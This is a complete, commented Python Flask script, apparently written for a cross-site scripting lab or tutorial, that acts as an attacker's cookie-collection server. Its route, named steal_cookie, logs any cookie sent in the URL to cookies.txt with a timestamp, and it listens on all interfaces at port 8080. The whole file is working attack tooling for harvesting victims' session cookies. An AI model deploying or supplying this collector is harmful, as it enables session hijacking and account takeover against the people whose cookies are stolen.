# Import necessary modules
from flask import Flask, request         # Flask handles the web server, request lets us access URL parameters
from datetime import datetime            # Used to get the current timestamp

# Initialize a Flask web application
app = Flask(__name__)

# Define a route for GET requests to the root URL ("/")
@app.route('/')
def steal_cookie():
    # Extract the value of the 'cookie' parameter from the URL
    cookie = request.args.get('cookie')

    # If a cookie was actually received
    if cookie:
        # Get current time in readable format (e.g., 2025-07-25 17:30:12)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Open (or create) cookies.txt and append the cookie with the timestamp
        with open("cookies.txt", "a") as f:
            f.write(f"[{timestamp}] Cookie: {cookie}\n")
        
        # Return a basic success message to whoever sent the request
        return "Cookie received!"
    
    # If no 'cookie' parameter in the URL, respond with a different message
    return "No cookie found."

# Start the Flask app on all network interfaces at port 8080
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
